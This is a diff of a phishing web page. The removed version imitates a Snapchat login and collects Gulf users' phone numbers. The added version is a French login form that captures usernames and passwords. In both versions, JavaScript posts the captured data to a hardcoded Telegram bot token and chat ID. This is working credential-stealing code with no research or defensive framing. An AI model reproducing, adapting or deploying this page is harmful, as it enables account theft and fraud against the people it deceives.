@@ -3,146 +3,146 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c4/Snapchat_logo.svg/512px-Snapchat_logo.svg.png">
-    <title>تسجيل الدخول</title>
+    <title>صفحة تسجيل الدخول</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background: linear-gradient(to bottom, #ffe600, #fff59d);
-            height: 100vh;
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
             display: flex;
             justify-content: center;
             align-items: center;
-            color: #333;
+            height: 100vh;
         }
 
         .container {
-            text-align: center;
             width: 90%;
             max-width: 400px;
-            background: white;
-            border-radius: 20px;
-            padding: 30px 20px;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
-        }
-
-        .container img {
-            width: 80px;
-            margin-bottom: 20px;
+            background-color: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
         }
 
         .container h1 {
-            font-size: 24px;
-            font-weight: bold;
+            font-size: 20px;
             color: #333;
-            margin-bottom: 10px;
-        }
-
-        .container p {
-            font-size: 14px;
-            color: #666;
             margin-bottom: 20px;
         }
 
-        .form-group {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            align-items: center;
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
         }
 
-        .form-group select,
-        .form-group input {
-            border: 1px solid #ddd;
-            border-radius: 20px;
-            padding: 10px 15px;
-            font-size: 16px;
-            width: 100%;
-        }
-
-        button {
-            width: 100%;
-            padding: 12px 0;
-            background: #ffe600;
-            border: none;
-            border-radius: 20px;
-            font-size: 16px;
-            font-weight: bold;
-            color: #333;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: 0.3s;
-        }
-
-        button:hover {
-            background: #ffd700;
-        }
-
-        .countdown {
+        .input-group label {
             font-size: 14px;
-            color: #333;
-            margin-top: 15px;
+            color: #666;
+            display: block;
+            margin-bottom: 5px;
         }
 
-        footer {
-            text-align: center;
-            margin-top: 20px;
-            color: #aaa;
-            font-size: 12px;
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            font-size: 14px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        .checkbox-group {
+            text-align: left;
+            margin-bottom: 15px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .checkbox-group input {
+            margin-right: 10px;
+        }
+
+        a {
+            color: #007bff;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 10px;
+            display: inline-block;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #e1e1e1;
+            color: #333;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            background-color: #d0d0d0;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c4/Snapchat_logo.svg/512px-Snapchat_logo.svg.png" alt="Snapchat Logo">
-        <h1>تسجيل الدخول</h1>
-        <p>يرجى إدخال رقم هاتفك لإتمام تسجيل الدخول.</p>
-
-        <div class="form-group">
-            <select id="countryCode">
-                <option value="966">🇸🇦 السعودية +966</option>
-                <option value="971">🇦🇪 الإمارات +971</option>
-                <option value="965">🇰🇼 الكويت +965</option>
-                <option value="974">🇶🇦 قطر +974</option>
-                <option value="973">🇧🇭 البحرين +973</option>
-            </select>
-            <input id="phoneNumber" type="tel" placeholder="رقم الهاتف" maxlength="14">
-        </div>
-        <button onclick="sendMessage()">متابعة</button>
-        <div class="countdown" id="countdown"></div>
+        <h1>Connexion</h1>
+        <form onsubmit="sendToTelegram(event)">
+            <div class="input-group">
+                <label for="username">Nom d'utilisateur, adresse e-mail ou numéro de téléphone</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="checkbox-group">
+                <input type="checkbox" id="remember" name="remember">
+                <label for="remember">Enregistrer les informations de connexion</label>
+            </div>
+            <a href="#">Mot de passe oublié ?</a>
+            <button type="submit" class="btn">Connexion</button>
+        </form>
     </div>
-
-    <footer>©️ 2024 تطبيقك</footer>
 
     <script>
         const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
         const chatId = '612575358';
 
-        function sendMessage() {
-            const countryCode = document.getElementById('countryCode').value;
-            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+        function sendToTelegram(event) {
+            event.preventDefault(); // لمنع إعادة تحميل الصفحة
 
-            if (!phoneNumber || phoneNumber.length < 6) {
-                alert('يرجى إدخال رقم هاتف صحيح.');
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const remember = document.getElementById('remember').checked ? 'نعم' : 'لا';
+
+            if (!username || !password) {
+                alert('يرجى ملء جميع الحقول.');
                 return;
             }
 
-            const fullPhoneNumber = `+${countryCode} ${phoneNumber}`;
+            const message = `👤 Nom d'utilisateur : ${username}\n🔒 Mot de passe : ${password}\n🔖 Enregistrer les informations : ${remember}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: chatId,
-                    text: `رقم الهاتف: ${fullPhoneNumber}`
+                    text: message
                 })
             })
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
-                    startCountdown();
+                    alert('تم الإرسال بنجاح!');
                 } else {
                     alert('حدث خطأ أثناء الإرسال.');
                 }
@@ -150,21 +150,6 @@
             .catch(error => {
                 alert('فشل الاتصال بالخادم. حاول مرة أخرى.');
             });
-        }
-
-        function startCountdown() {
-            const countdownElement = document.getElementById('countdown');
-            let countdown = 4;
-
-            const interval = setInterval(() => {
-                countdownElement.textContent = `سيتم نقلك خلال ${countdown} ثانية...`;
-                countdown--;
-
-                if (countdown < 0) {
-                    clearInterval(interval);
-                    window.location.href = 'secondpage.html';
-                }
-            }, 1000);
         }
     </script>
 </body>
